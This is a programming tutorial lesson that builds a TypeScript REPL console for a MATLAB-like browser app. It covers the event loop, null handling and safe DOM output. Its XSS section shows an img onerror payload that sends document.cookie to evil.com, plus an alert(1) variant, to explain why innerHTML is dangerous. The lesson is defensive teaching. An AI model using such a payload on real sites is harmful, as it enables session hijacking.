# Lesson 03 — The Console
## The Event Loop, XSS, and the First Working Feature

---

## What You Will Build

By the end of this lesson you will have:

- A working REPL: type text, press Enter, see it in the output panel
- The Run button executing whatever is in the editor
- The Clear button clearing the output
- Safe handling of user input (no XSS vulnerability)
- A structured output system that Lesson 04's Matrix display will plug into

This is the first lesson where MikeLab does something. Every lesson
from here adds to a working system, not a skeleton.

---

## What You Need To Know First

From Lessons 00, 01, and 02:

```
✓ TypeScript: variables, functions, classes, type annotations
✓ The DOM: document.getElementById, textContent
✓ The MikeLab UI shell from Lesson 02 is built and running
✓ How to start the dev server: cd packages/ui && pnpm dev
```

---

# Part 1: The Event Loop

## How JavaScript Handles Multiple Things

JavaScript is single-threaded. It can only do one thing at a time.
But web pages need to do many things "simultaneously": respond to
clicks, run timers, fetch data from servers, play animations.

The event loop is how JavaScript handles this.

## What the Event Loop Is

Think of JavaScript's runtime as having three parts:

```
CALL STACK          TASK QUEUE          EVENT LOOP
-----------         -----------         -----------
The work            Things waiting      The traffic cop
being done          to be done          between them
right now
```

**The call stack** is where code runs. When you call a function,
it goes on the stack. When it returns, it comes off. If a function
calls another function, both are on the stack simultaneously.

```typescript
function greet(name: string): string {
    return formatName(name);    // formatName goes onto the stack
}                               // formatName returns, comes off stack

function formatName(name: string): string {
    return `Hello, ${name}`;   // this runs while greet is still on stack
}

greet('MikeLab');   // greet goes onto the stack
                    // when greet returns, it comes off
```

**The task queue** holds callbacks waiting to run. When you do:

```typescript
button.addEventListener('click', () => {
    console.log('clicked');
});
```

...you are telling the browser: "when this button is clicked, add
this callback function to the task queue."

**The event loop** constantly checks: "is the call stack empty?
Is there anything in the task queue?" When both are true —
call stack empty, task queue has something — it moves the next
task from the queue onto the call stack.

## Why This Matters for MikeLab

When the user presses a key in the editor, the browser:

1. Detects the keypress (in the browser's input system, outside JS)
2. Adds a "keydown" event to the task queue
3. Event loop sees the call stack is empty
4. Event loop moves the keydown task to the call stack
5. Your `keydown` handler runs
6. Handler returns, call stack is empty again
7. Event loop looks for the next task

This means your event handlers must return quickly. If a handler
takes 5 seconds to run, the UI is frozen for those 5 seconds —
nothing responds, the page appears broken. The call stack is occupied
the whole time, and no new events can be processed.

For MikeLab this means: evaluating MATLAB code will eventually need
to happen asynchronously (in a web worker) for large computations.
For now, our evaluations will be fast enough that blocking is fine.
We will revisit this in a later lesson.

## What a Call Stack Trace Is

When JavaScript throws an error, it shows a "stack trace" — a list
of every function call that was active when the error occurred,
from most recent to least recent.

```
TypeError: Cannot read properties of null (reading 'textContent')
    at updateOutput (main.ts:45:21)
    at handleRun (main.ts:32:5)
    at HTMLButtonElement.<anonymous> (main.ts:18:3)
```

Reading this from bottom to top:
1. A click handler on an HTMLButtonElement called handleRun
2. handleRun called updateOutput
3. updateOutput tried to access `.textContent` on a null value

The stack trace tells you exactly where to look. `main.ts:45:21`
means line 45, column 21 of `main.ts`. Open the file, go to that line.

When you see an error in the browser console, always read the stack
trace. It is the direct path to the bug.

---

# Part 2: XSS — The Security Threat We Build Against

## What XSS Is

XSS stands for Cross-Site Scripting. It is one of the most common
security vulnerabilities in web applications, and it is directly
relevant to MikeLab because MikeLab takes user input and displays it.

**The attack:**

Imagine MikeLab takes the user's input and displays it like this:

```typescript
// DANGEROUS — do not write this
outputDiv.innerHTML = userInput;
```

`innerHTML` parses its argument as HTML. If a user types:

```html
<img src="x" onerror="fetch('https://evil.com/?token=' + document.cookie)">
```

...the browser will:
1. Try to load the image (fails, `x` is not a valid image URL)
2. Run the `onerror` handler because the image failed
3. Send the user's cookies to `evil.com`

This is an XSS attack. The attacker injected JavaScript into your
page by crafting input that your application put into `innerHTML`
without escaping it.

**Why cookies matter:** if MikeLab ever has user accounts, session
cookies are how the server knows who is logged in. Stealing a cookie
lets the attacker impersonate that user.

## The Defence: textContent and createTextNode

The defence is simple: never use `innerHTML` with user-provided content.

`innerHTML` parses HTML. It sees `<img>` tags and creates image elements.
It sees `<script>` tags and runs JavaScript.

`textContent` treats its argument as plain text. `<img>` becomes the
literal characters `<`, `i`, `m`, `g`, `>` — not an HTML element.
No parsing. No JavaScript execution.

```typescript
// DANGEROUS
outputDiv.innerHTML = userInput;

// SAFE
outputDiv.textContent = userInput;
```

If you need to display user content AND add HTML structure around it,
use `document.createElement` and `textContent`:

```typescript
// SAFE: create the structure with createElement,
// put user content in with textContent
const line = document.createElement('div');
line.className = 'output-line';
line.textContent = userInput;    // user content as plain text
outputDiv.appendChild(line);     // add to the DOM
```

`document.createElement('div')` creates a new `<div>` element that
is not yet in the DOM. `line.textContent = userInput` sets its text
content safely. `outputDiv.appendChild(line)` adds it to the DOM
as a child of `outputDiv`.

This pattern — create element, set content, append — is the safe
way to build dynamic HTML from user input. Memorise it.

## When innerHTML Is Safe

`innerHTML` is safe when you control the entire string — when no part
of it comes from user input:

```typescript
// SAFE: the string is entirely your code, no user input
line.innerHTML = '<span class="keyword">function</span>';

// DANGEROUS: userInput is from a textarea
line.innerHTML = `<span>${userInput}</span>`;
```

In MikeLab, we will use `innerHTML` for syntax highlighting (where
we control the HTML being generated) but never for displaying user
input or evaluation results.

---

# Part 3: The REPL Pattern

## What a REPL Is

REPL stands for Read-Evaluate-Print Loop:

```
READ    → get input from the user
EVALUATE → process it
PRINT   → display the result
LOOP    → do it again
```

Every interactive programming environment is a REPL:
- The browser console (type JS, press Enter, see result)
- The Python shell (`>>>`)
- MATLAB's command window
- Node.js interactive mode (`node` with no arguments)

MikeLab's REPL works like this:

```
READ    → user types MATLAB code in the editor
EVALUATE → we run it through @mikelab/parser and @mikelab/core
PRINT   → we display the result in the output panel
LOOP    → user types more code
```

In this lesson, we implement just the READ and PRINT parts.
The EVALUATE step will be replaced with an echo (print back what was
typed) until Lesson 22 when the real evaluator is complete.

## Why Echo First

Building echo before building evaluation is a deliberate engineering decision.

We need to:
1. Get keyboard input from the editor
2. Process it somehow
3. Display output in the output panel
4. Handle errors
5. Support the Run button and Enter key
6. Format output properly

All of these are required whether we echo or evaluate. By starting
with echo, we build and test the entire input→output pipeline with
trivial logic. When the real evaluator is ready, we replace the
echo step — everything else is already correct.

If we started with the evaluator, we would be debugging the
input pipeline and the evaluator simultaneously. That makes bugs
much harder to find.

---

# Part 4: TypeScript: null, undefined, and Optional Chaining

Before writing the code, these TypeScript concepts appear throughout
the lesson and need to be understood before you encounter them.

## null and undefined

JavaScript has two "no value" values:

```typescript
// undefined: a variable that has been declared but not given a value
let x: number | undefined;
console.log(x);    // undefined

// null: an intentional absence of value
let y: number | null = null;
```

They are different concepts, though often confused:
- `undefined` means "this variable exists but has no value yet"
- `null` means "this variable intentionally has no value"

In practice: `document.getElementById()` returns `null` when the
element is not found (intentional absence — it looked and found nothing).
A variable you declare without initialising is `undefined`.

TypeScript's `strict` mode forces you to handle both. If a function
can return `null`, TypeScript will not let you use the result
without checking for null first.

## The | null Type Annotation

`HTMLElement | null` means "this value is either an HTMLElement or null".
TypeScript tracks which you have:

```typescript
const el: HTMLElement | null = document.getElementById('btn');

// TypeScript error: el might be null
el.textContent = 'hello';    // ERROR: Object is possibly 'null'

// After a null check, TypeScript knows el is not null
if (el !== null) {
    el.textContent = 'hello';    // OK: el is HTMLElement here
}

// Or use the non-null assertion operator (use sparingly)
el!.textContent = 'hello';    // tells TS: "I know it's not null"
```

## Optional Chaining ?.

The `?.` operator lets you access a property or call a method on
something that might be null, without throwing if it is:

```typescript
const el = document.getElementById('btn');    // HTMLElement | null

// Without optional chaining:
if (el !== null) {
    el.addEventListener('click', handler);
}

// With optional chaining:
el?.addEventListener('click', handler);
// If el is null: does nothing, no error
// If el is not null: calls addEventListener
```

Use `?.` when null is acceptable (do nothing if absent).
Use an explicit null check when null means something is wrong.

## Nullish Coalescing ??

`??` provides a fallback for null or undefined:

```typescript
const value = possiblyNull ?? 'default';
// If possiblyNull is null or undefined: value = 'default'
// Otherwise: value = possiblyNull
```

Different from `||` (OR operator): `||` treats any falsy value
(0, '', false, null, undefined) as false. `??` only treats null
and undefined as "missing" — 0 and '' are valid values.

```typescript
const count = userInput ?? 0;
// If userInput is null: count = 0
// If userInput is 0:    count = 0   (keeps the 0, not a fallback!)

const count2 = userInput || 0;
// If userInput is null: count2 = 0
// If userInput is 0:    count2 = 0  (replaces 0 with fallback — wrong!)
```

---

# Part 5: Building the Console

## Step 1: Plan the Output System

Before writing code, plan what the output system needs to support.
It will eventually display:
- Plain text (echo, status messages)
- Matrices (formatted tables)
- Numbers (scalars)
- Errors (with different styling)
- Plots (canvas elements)

Design the output system to handle all of these from the start,
even though only plain text is used today. This is the **open/closed
principle**: open for extension (adding new output types), closed
for modification (adding a new type does not require rewriting the
existing output code).

Create `packages/ui/src/output/OutputType.ts`:

```typescript
// packages/ui/src/output/OutputType.ts
//
// Defines the types of output MikeLab can display.
// Adding a new output type: add a new value to this enum
// and handle it in OutputRenderer.ts.
// No other file needs to change.

export enum OutputType {
    // Plain text — used for echo, status messages
    Text = 'text',

    // An error message — styled differently from text
    Error = 'error',

    // A warning — styled differently from text and error
    Warning = 'warning',

    // A MATLAB command (the input that was run)
    // Displayed before its result so the output is self-documenting
    Command = 'command',

    // System message (startup, clear, etc.)
    System = 'system',
}
```

**What an enum is:**

An enum (enumeration) is a set of named constants. Without enums,
you might write:

```typescript
// Fragile: a typo in the string is a silent bug
if (type === 'errror') { ... }    // typo — condition is always false
```

With an enum:

```typescript
// TypeScript catches this: OutputType.Errror does not exist
if (type === OutputType.Errror) { ... }    // COMPILE ERROR
```

Enums also make code more readable — `OutputType.Error` is more
descriptive than the string `'error'`.

Create `packages/ui/src/output/OutputEntry.ts`:

```typescript
// packages/ui/src/output/OutputEntry.ts
//
// An OutputEntry represents one item in the output panel.
// The output panel is a list of entries displayed in order.

import { OutputType } from './OutputType.js';

export interface OutputEntry {
    // What kind of output this is.
    // Determines how it is styled and rendered.
    type: OutputType;

    // The text content.
    // For Text and Command types, this is displayed directly.
    // For Error, it is the error message.
    content: string;

    // When this entry was created.
    // Used for timestamping (if we add timestamps later).
    timestamp: Date;
}
```

**What an interface is (reviewed from Lesson 00):**

An interface describes the shape of an object — what properties it
has and what types they are. It is a contract: any object that
claims to be an `OutputEntry` must have exactly these fields
with these types.

```typescript
// This satisfies the OutputEntry interface
const entry: OutputEntry = {
    type: OutputType.Text,
    content: 'Hello',
    timestamp: new Date(),
};

// TypeScript error: missing 'timestamp' field
const bad: OutputEntry = {
    type: OutputType.Text,
    content: 'Hello',
};    // ERROR: Property 'timestamp' is missing
```

## Step 2: Build the Output Renderer

Create `packages/ui/src/output/OutputRenderer.ts`:

```typescript
// packages/ui/src/output/OutputRenderer.ts
//
// Renders OutputEntry objects into the DOM.
// This class knows HOW to display output.
// It does not know WHAT to display — that comes from the REPL.
//
// Single responsibility: one class, one job.
// When we add Matrix rendering in Lesson 05, we add it here.
// The REPL code does not need to change.

import { OutputEntry } from './OutputEntry.js';
import { OutputType } from './OutputType.js';

export class OutputRenderer {
    // The DOM element where output entries are appended.
    // Private: only this class accesses it directly.
    private readonly container: HTMLElement;

    constructor(containerId: string) {
        // Find the container element by id.
        const element = document.getElementById(containerId);

        if (element === null) {
            // If the container does not exist, there is no point continuing.
            // This is a programming error (wrong id), not a user error.
            // We throw immediately with a clear message.
            throw new Error(
                `OutputRenderer: no element found with id="${containerId}". ` +
                `Check that index.html contains this element.`
            );
        }

        this.container = element;
    }

    // ============================================================
    // PUBLIC API
    // These are the methods other code calls.
    // ============================================================

    render(entry: OutputEntry): void {
        // Create the wrapper element for this entry.
        const entryElement = this.createEntryElement(entry);

        // Append it to the container.
        // appendChild adds a node as the last child of the container.
        this.container.appendChild(entryElement);

        // Scroll to show the newest output.
        // scrollTop: the number of pixels scrolled from the top.
        // scrollHeight: the total height of the content.
        // Setting scrollTop = scrollHeight scrolls to the bottom.
        this.container.scrollTop = this.container.scrollHeight;
    }

    renderMany(entries: OutputEntry[]): void {
        // Render multiple entries at once.
        // entries: OutputEntry[] means "an array of OutputEntry objects".
        for (const entry of entries) {
            // for...of iterates over every item in an array.
            // entry takes the value of each item in turn.
            this.render(entry);
        }
    }

    clear(): void {
        // Remove all child elements from the container.
        // textContent = '' removes all children efficiently.
        // It is faster than removing children one by one
        // and does not trigger unnecessary DOM events.
        this.container.textContent = '';
    }

    // ============================================================
    // PRIVATE HELPERS
    // Implementation details — not part of the public API.
    // ============================================================

    private createEntryElement(entry: OutputEntry): HTMLElement {
        // Create a wrapper div for the entry.
        const wrapper = document.createElement('div');

        // Add CSS classes based on the entry type.
        // 'output-entry' is always added.
        // A type-specific class is also added for styling.
        wrapper.className = `output-entry output-entry--${entry.type}`;
        // Template literal: wraps the entry.type value in the class name.
        // Result examples:
        //   'output-entry output-entry--text'
        //   'output-entry output-entry--error'
        //   'output-entry output-entry--command'

        // Switch on the type to render differently for each.
        switch (entry.type) {
            case OutputType.Command:
                this.renderCommand(wrapper, entry.content);
                break;

            case OutputType.Error:
                this.renderError(wrapper, entry.content);
                break;

            case OutputType.Warning:
                this.renderWarning(wrapper, entry.content);
                break;

            case OutputType.System:
                this.renderSystem(wrapper, entry.content);
                break;

            case OutputType.Text:
            default:
                // default handles any OutputType values not listed above.
                // Also handles Text as the fallback.
                this.renderText(wrapper, entry.content);
                break;
        }

        return wrapper;
    }

    private renderText(element: HTMLElement, content: string): void {
        // Split the content by newline so each line is a separate element.
        // This lets us style individual lines if needed later.
        const lines = content.split('\n');
        // split('\n') divides the string at every newline character.
        // 'line1\nline2\nline3'.split('\n') → ['line1', 'line2', 'line3']

        for (const line of lines) {
            const lineElement = document.createElement('div');
            lineElement.className = 'output-line';

            // SAFE: textContent, not innerHTML.
            // Even though this is our own text (not user input here),
            // we use textContent consistently as a rule.
            // If this were ever to carry user-generated content,
            // the safe pattern is already in place.
            lineElement.textContent = line || '\u00A0';
            // '\u00A0' is the Unicode non-breaking space character.
            // Empty lines would collapse to zero height without content.
            // A non-breaking space gives them their full line height.

            element.appendChild(lineElement);
        }
    }

    private renderCommand(element: HTMLElement, content: string): void {
        // Commands are displayed with a prompt prefix (>> like MATLAB)
        const lines = content.split('\n');

        lines.forEach((line, index) => {
            // forEach is an array method that calls a function for each item.
            // The function receives (item, index) as arguments.
            const lineElement = document.createElement('div');
            lineElement.className = 'output-line output-line--command';

            const prompt = document.createElement('span');
            prompt.className = 'prompt';
            // First line gets >> prefix, continuation lines get spaces
            prompt.textContent = index === 0 ? '>> ' : '   ';
            // Ternary operator: condition ? valueIfTrue : valueIfFalse

            const code = document.createElement('span');
            code.textContent = line;
            // SAFE: user input goes into textContent here,
            // never into innerHTML.

            lineElement.appendChild(prompt);
            lineElement.appendChild(code);
            element.appendChild(lineElement);
        });
    }

    private renderError(element: HTMLElement, content: string): void {
        const lineElement = document.createElement('div');
        lineElement.className = 'output-line output-line--error';

        const icon = document.createElement('span');
        icon.className = 'error-icon';
        icon.textContent = '✗ ';    // Unicode cross mark

        const message = document.createElement('span');
        message.textContent = content;    // SAFE: textContent

        lineElement.appendChild(icon);
        lineElement.appendChild(message);
        element.appendChild(lineElement);
    }

    private renderWarning(element: HTMLElement, content: string): void {
        const lineElement = document.createElement('div');
        lineElement.className = 'output-line output-line--warning';
        lineElement.textContent = `⚠ ${content}`;    // Unicode warning sign
        element.appendChild(lineElement);
    }

    private renderSystem(element: HTMLElement, content: string): void {
        const lineElement = document.createElement('div');
        lineElement.className = 'output-line output-line--system';
        lineElement.textContent = content;    // SAFE: textContent
        element.appendChild(lineElement);
    }
}
```

## Step 3: Build a Factory for OutputEntry Objects

Creating `OutputEntry` objects by hand every time is verbose.
A factory function creates them with less code:

Create `packages/ui/src/output/createEntry.ts`:

```typescript
// packages/ui/src/output/createEntry.ts
//
// Factory functions for creating OutputEntry objects.
// Instead of writing out the full object literal every time,
// callers use these named functions.
//
// Why named functions instead of one generic function?
// Named functions are self-documenting.
// createError('message') is clearer than createEntry(OutputType.Error, 'message').
// The intent is visible at the call site.

import { OutputEntry } from './OutputEntry.js';
import { OutputType } from './OutputType.js';

// A helper that creates the base entry structure.
// Private to this module — not exported.
// The 'content' parameter can be a string or any value we convert to string.
function makeEntry(type: OutputType, content: string): OutputEntry {
    return {
        type,
        // 'type' alone is shorthand for 'type: type' in an object literal.
        // When the key and variable name are the same, you can omit the value.
        content,
        timestamp: new Date(),
        // new Date() creates a Date object representing the current moment.
    };
}

// Each of these creates one specific kind of OutputEntry.
// Exported: these are the public API of this module.

export function createTextEntry(content: string): OutputEntry {
    return makeEntry(OutputType.Text, content);
}

export function createErrorEntry(message: string): OutputEntry {
    return makeEntry(OutputType.Error, message);
}

export function createWarningEntry(message: string): OutputEntry {
    return makeEntry(OutputType.Warning, message);
}

export function createCommandEntry(command: string): OutputEntry {
    return makeEntry(OutputType.Command, command);
}

export function createSystemEntry(message: string): OutputEntry {
    return makeEntry(OutputType.System, message);
}
```

## Step 4: Build the REPL

Create `packages/ui/src/repl/Repl.ts`:

```typescript
// packages/ui/src/repl/Repl.ts
//
// The REPL — Read-Evaluate-Print Loop.
// Connects the editor (input) to the output renderer (display).
//
// In this lesson, the EVALUATE step is just echo:
// we repeat back what the user typed.
// In Lesson 22, evaluate() will call @mikelab/parser to run real MATLAB.
//
// The REPL knows nothing about rendering — it delegates to OutputRenderer.
// The REPL knows nothing about MATLAB evaluation — it delegates to evaluate().
// Single responsibility: manage the input/output flow.

import { OutputRenderer } from '../output/OutputRenderer.js';
import {
    createTextEntry,
    createErrorEntry,
    createCommandEntry,
    createSystemEntry,
} from '../output/createEntry.js';

export class Repl {
    private readonly renderer: OutputRenderer;
    private readonly editor: HTMLTextAreaElement;

    // history: the list of commands previously entered.
    // Used for history navigation (up/down arrows) — added in a later lesson.
    private history: string[] = [];
    // string[] means "array of strings".
    // = [] initialises it as an empty array.

    constructor(editorId: string, outputContainerId: string) {
        // Find the editor element.
        const editorElement = document.getElementById(editorId);

        if (editorElement === null) {
            throw new Error(`Repl: no element found with id="${editorId}"`);
        }

        // We need the textarea-specific property .value.
        // HTMLElement does not have .value — only HTMLTextAreaElement does.
        // We check that the element is actually a textarea.
        if (!(editorElement instanceof HTMLTextAreaElement)) {
            // instanceof checks whether an object is an instance of a class.
            // HTMLTextAreaElement is the class for <textarea> elements.
            throw new Error(
                `Repl: element #${editorId} must be a textarea, ` +
                `but found ${editorElement.tagName.toLowerCase()}`
            );
        }

        this.editor = editorElement;
        this.renderer = new OutputRenderer(outputContainerId);

        // Show a startup message.
        this.renderer.render(
            createSystemEntry('MikeLab 0.1.0 — MATLAB-compatible math engine')
        );
        this.renderer.render(
            createSystemEntry('Type MATLAB code and press Enter or click Run.')
        );
    }

    // ============================================================
    // PUBLIC METHODS
    // ============================================================

    run(): void {
        // Get the current text in the editor.
        const input = this.editor.value;
        // .value is the current text content of a textarea.
        // Unlike .textContent (which returns the text between tags),
        // .value returns what the user has typed.

        // Remove leading and trailing whitespace.
        // If the user pressed Enter on an empty line, we ignore it.
        const trimmed = input.trim();
        // trim() returns a new string with whitespace removed from both ends.
        // Whitespace includes spaces, tabs, and newlines.
        // ' hello world  '.trim() → 'hello world'

        if (trimmed.length === 0) {
            // Nothing to do. Do not add a blank entry to the output.
            return;
        }

        // Add to history.
        this.history.push(trimmed);
        // push() adds an element to the end of an array.
        // Mutates the array in place (no new array created).

        // Display the command in the output panel.
        this.renderer.render(createCommandEntry(trimmed));

        // Evaluate and display the result.
        // In this lesson: echo (display what was typed).
        // In Lesson 22: call the real MATLAB evaluator.
        const result = this.evaluate(trimmed);
        this.renderer.render(createTextEntry(result));
    }

    runAll(): void {
        // Run the entire contents of the editor as one block.
        // Each line is treated as a separate command.
        const input = this.editor.value;

        if (input.trim().length === 0) {
            return;
        }

        // Split the input into lines.
        const lines = input.split('\n');
        // split('\n') divides the string at every newline.
        // 'a\nb\nc'.split('\n') → ['a', 'b', 'c']

        for (const line of lines) {
            const trimmed = line.trim();
            if (trimmed.length === 0) {
                // Skip blank lines.
                continue;
                // continue skips the rest of this loop iteration
                // and moves to the next one.
            }

            this.history.push(trimmed);
            this.renderer.render(createCommandEntry(trimmed));

            try {
                // try: run this code. If it throws, go to catch.
                const result = this.evaluate(trimmed);
                this.renderer.render(createTextEntry(result));
            } catch (error) {
                // catch: runs if the code in try throws an error.
                // error is the thrown value — usually an Error object.
                const message = error instanceof Error
                    ? error.message
                    : String(error);
                // Ternary: if error is an Error object, use .message.
                // Otherwise convert it to a string with String().

                this.renderer.render(createErrorEntry(message));
                // Do not stop — continue evaluating remaining lines.
            }
        }
    }

    clear(): void {
        this.renderer.clear();
        this.renderer.render(
            createSystemEntry('Output cleared.')
        );
    }

    clearEditor(): void {
        this.editor.value = '';
        // Setting .value to '' empties the textarea.
        this.editor.focus();
        // focus() moves keyboard focus to the textarea,
        // so the user can immediately start typing.
    }

    // ============================================================
    // PRIVATE: EVALUATION
    // Replace this method in Lesson 22 with real MATLAB evaluation.
    // Everything else stays the same.
    // ============================================================

    private evaluate(input: string): string {
        // For now: echo the input back.
        // This proves the entire input → display pipeline works
        // before we add the complexity of real evaluation.
        return `echo: ${input}`;

        // In Lesson 22, this becomes:
        // return evaluateMATLAB(input, this.environment);
    }
}
```

## Step 5: Update main.ts

Replace the contents of `packages/ui/src/main.ts` with:

```typescript
// packages/ui/src/main.ts
//
// Application entry point.
// Sets up the REPL and connects it to the UI controls.

import { Repl } from './repl/Repl.js';

// Create the REPL — connects the editor to the output panel.
// If either element is missing, the constructor throws with a clear error.
const repl = new Repl('editor', 'output-content');

// ============================================================
// CONNECT THE RUN BUTTON
// ============================================================

const btnRun = document.getElementById('btn-run');

btnRun?.addEventListener('click', () => {
    repl.runAll();
    // Run all lines in the editor when the button is clicked.
});

// ============================================================
// CONNECT THE CLEAR BUTTON
// ============================================================

const btnClear = document.getElementById('btn-clear');

btnClear?.addEventListener('click', () => {
    repl.clear();
});

// ============================================================
// KEYBOARD SHORTCUTS
// ============================================================

const editor = document.getElementById('editor') as HTMLTextAreaElement | null;

editor?.addEventListener('keydown', (event: KeyboardEvent) => {
    // event is a KeyboardEvent object — the browser creates it
    // whenever a key is pressed and passes it to the handler.

    // event.key is a string describing which key was pressed.
    // Common values: 'Enter', 'Escape', 'Tab', 'ArrowUp', 'ArrowDown'
    // For letter keys: 'a', 'b', 'A', 'B' (case-sensitive)

    // Shift+Enter: run the current line (cursor line), not everything
    if (event.key === 'Enter' && event.shiftKey) {
        // event.shiftKey is true if the Shift key is held down.
        // event.ctrlKey, event.altKey, event.metaKey work the same way.
        // metaKey is the Command key on Mac.

        event.preventDefault();
        // preventDefault() stops the default browser action for this event.
        // For Enter in a textarea, the default action is adding a newline.
        // We prevent that so Shift+Enter runs instead of adding a newline.

        repl.run();
        return;
    }

    // Ctrl+Enter (Windows) or Cmd+Enter (Mac): run all
    if (event.key === 'Enter' && (event.ctrlKey || event.metaKey)) {
        event.preventDefault();
        repl.runAll();
        return;
    }
});

// ============================================================
// CURSOR POSITION IN STATUS BAR
// ============================================================

const cursorPosition = document.getElementById('cursor-position');

function updateCursorPosition(): void {
    if (!editor || !cursorPosition) return;

    const index = editor.selectionStart ?? 0;
    const textBefore = editor.value.substring(0, index);
    const lines = textBefore.split('\n');
    const line = lines.length;
    const col = lines[lines.length - 1].length + 1;

    cursorPosition.textContent = `Ln ${line}, Col ${col}`;
}

editor?.addEventListener('click', updateCursorPosition);
editor?.addEventListener('keyup', updateCursorPosition);
updateCursorPosition();
// Call once on load to show "Ln 1, Col 1" immediately.
```

## Step 6: Add Output Styles to CSS

Open `packages/ui/src/styles/main.css` and add these rules at the end:

```css
/* ============================================================
   OUTPUT ENTRIES
   Styles for each type of output entry rendered by OutputRenderer.
   ============================================================ */

.output-entry {
    /* Each entry has a small gap below it. */
    margin-bottom: 2px;
}

.output-line {
    /* Each line within an entry. */
    white-space: pre;
    /* white-space: pre preserves whitespace and line breaks
       exactly as they appear in the content.
       Without this, multiple spaces collapse to one,
       and matrix alignment would be broken. */
    min-height: 1.6em;
    /* Ensure blank lines have height (matches line-height). */
}

/* Command lines (user input displayed in output) */
.output-line--command {
    color: var(--color-text);
}

.prompt {
    color: var(--color-accent);
    user-select: none;
    /* user-select: none prevents the prompt ">>" from being
       selected when the user selects output text to copy.
       They want the code, not the prompt. */
}

/* Error lines */
.output-line--error {
    color: var(--color-error);
}

.error-icon {
    font-weight: bold;
}

/* Warning lines */
.output-line--warning {
    color: var(--color-warning);
}

/* System messages */
.output-line--system {
    color: var(--color-text-muted);
    font-style: italic;
}

/* Separator between sessions / after clear */
.output-separator {
    border: none;
    border-top: 1px solid var(--color-border);
    margin: var(--spacing-sm) 0;
}
```

## Step 7: Run and Test

Start the dev server:

```powershell
cd packages\ui
pnpm dev
```

Open the browser. You should see:

```
MikeLab 0.1.0 — MATLAB-compatible math engine
Type MATLAB code and press Enter or click Run.
```

Type something in the editor:

```
A = [1 2; 3 4]
```

Press `Shift+Enter`. You should see:

```
>> A = [1 2; 3 4]
echo: A = [1 2; 3 4]
```

Type more lines, then press `Ctrl+Enter` to run all of them.
Click Clear to reset the output.

Open developer tools (`F12`) → Console tab. You should see no errors.
Any errors visible there need to be fixed before continuing.

## Step 8: Commit

```powershell
cd ..\..
git add .
git commit -m "lesson 03: REPL with echo, XSS-safe output renderer, keyboard shortcuts"
```

---

# Connect the Pieces

The pipeline you built today:

```
User types in editor
        ↓
Shift+Enter OR Ctrl+Enter OR Run button
        ↓
Repl.run() or Repl.runAll()
        ↓
Repl.evaluate(input) → result (currently: "echo: " + input)
        ↓
OutputRenderer.render(createTextEntry(result))
        ↓
createEntryElement() → DOM element
        ↓
container.appendChild(element)
        ↓
Browser renders the new element
        ↓
User sees the result
```

In Lesson 22, the only part that changes is `Repl.evaluate()`.
The pipeline before and after it stays exactly as it is today.

---

# What Breaks Without This

## Using innerHTML with user input

```typescript
// NEVER DO THIS
lineElement.innerHTML = userInput;
```

If a user types:
```
<img src=x onerror=alert(1)>
```

The browser creates an image element, fails to load it, and runs
the `onerror` handler. In a real app with real cookies and sessions,
this can steal credentials. `alert(1)` is the harmless demonstration
version — real attacks are far more subtle.

## Not calling preventDefault() on Enter

Without `event.preventDefault()` in the Shift+Enter handler, the
browser adds a newline AND triggers the run. The newline goes into
the editor content, causing unexpected results in multi-line evaluation.

## Using innerHTML to clear output

```typescript
// Slower than textContent = ''
while (container.firstChild) {
    container.removeChild(container.firstChild);
}

// Faster and correct
container.textContent = '';
```

Removing children one by one with `removeChild` is slow for large
outputs (triggers one DOM reflow per removal). `textContent = ''`
clears everything in one operation.

---

# Challenges

**Challenge 1:**

Add a command history feature. The `Repl` class already stores
history in `this.history`. Add keyboard handling in `main.ts`
so that:

- Pressing `ArrowUp` in the editor replaces the editor content
  with the previous command in history
- Pressing `ArrowDown` moves forward through history
- Pressing `ArrowDown` past the end restores the editor to empty

Keep track of the current history position with a number variable.
Test it by running several commands then pressing ArrowUp.

**Challenge 2:**

The `evaluate()` method currently returns a string.
But some MATLAB expressions should suppress output (when the line
ends with `;`). MATLAB's rule: if a statement ends with semicolon,
print nothing; otherwise print the result.

Update `evaluate()` in `Repl.ts` to check whether `input` ends
with `;`. If it does, return `null` (nothing to display). If it
does not, return the echo string.

Update `run()` and `runAll()` to check whether the result is `null`
before rendering. If null, skip the render step.

This prepares the architecture for real MATLAB evaluation in Lesson 22.

**Challenge 3:**

The `OutputType` enum currently has 5 values. Add a 6th:
`Success` — for results that completed without errors.
Style it with `var(--color-success)` in the CSS.
Add a `createSuccessEntry` factory function.

Then update the echo path in `evaluate()` to return an object
`{ content: string, type: OutputType }` instead of just a string,
so the REPL can use the correct entry type.

This requires changing the return type of `evaluate()`,
`run()`, and `runAll()`. TypeScript will catch every place
that needs updating. Fix each error TypeScript reports.

---

# Definition of Done

```
□ pnpm dev starts without errors
□ Typing in the editor and pressing Shift+Enter shows the echoed result
□ Pressing Ctrl+Enter runs all lines in the editor
□ Clicking Run does the same as Ctrl+Enter
□ Clicking Clear resets the output and shows "Output cleared."
□ Command lines display with green >> prefix
□ Error entries are red (test by temporarily throwing in evaluate())
□ System messages are muted/italic
□ F12 → Console tab shows no JavaScript errors
□ All three challenges completed
□ Changes committed to git
```
